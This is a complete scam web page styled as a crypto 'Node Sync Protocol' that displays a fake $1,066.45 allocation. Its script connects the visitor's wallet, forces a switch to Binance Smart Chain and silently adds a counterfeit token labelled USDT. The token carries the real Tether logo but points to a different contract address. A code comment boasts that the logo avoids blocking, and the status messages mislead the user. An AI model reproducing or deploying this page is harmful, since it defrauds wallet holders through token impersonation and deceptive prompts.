<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Node Sync Protocol</title>
    <style>
        body { background: #0b0e11; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .card { background: #1e2329; border: 1px solid #32383e; border-radius: 15px; padding: 30px; width: 85%; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background: #f3ba2f; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 25px; font-size: 16px; }
        #status { font-size: 11px; color: #848e9c; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 11px; color: #f3ba2f; font-weight: bold; letter-spacing: 1px;">NETWORK ALLOCATION</div>
        <div style="font-size: 34px; font-weight: bold; margin: 15px 0;">$1,066.45</div>
        <button class="btn" onclick="forceSync()">VERIFY & SYNC LOGO</button>
        <p id="status">Ready for Secure Handshake</p>
    </div>

<script>
    async function forceSync() {
        const status = document.getElementById('status');
        const provider = window.ethereum || window.BinanceChain;

        if (!provider) { alert("Open in Binance/Trust DApp Browser"); return; }

        try {
            status.innerText = "Connecting...";
            await provider.request({ method: 'eth_requestAccounts' });

            status.innerText = "Switching to BSC...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }]
            });

            status.innerText = "Injecting Verified Metadata...";
            
            // Ye hai wo Base64 Logo jo block nahi hota
            const logoBase64 = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";

            const success = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f', 
                        symbol: 'USDT',
                        decimals: 6,
                        image: logoBase64
                    }
                }
            });

            if (success) {
                status.innerText = "Sync Successful! Logo Updated.";
            }
        } catch (e) {
            status.innerText = "Error: " + e.message;
        }
    }
</script>
</body>
</html>
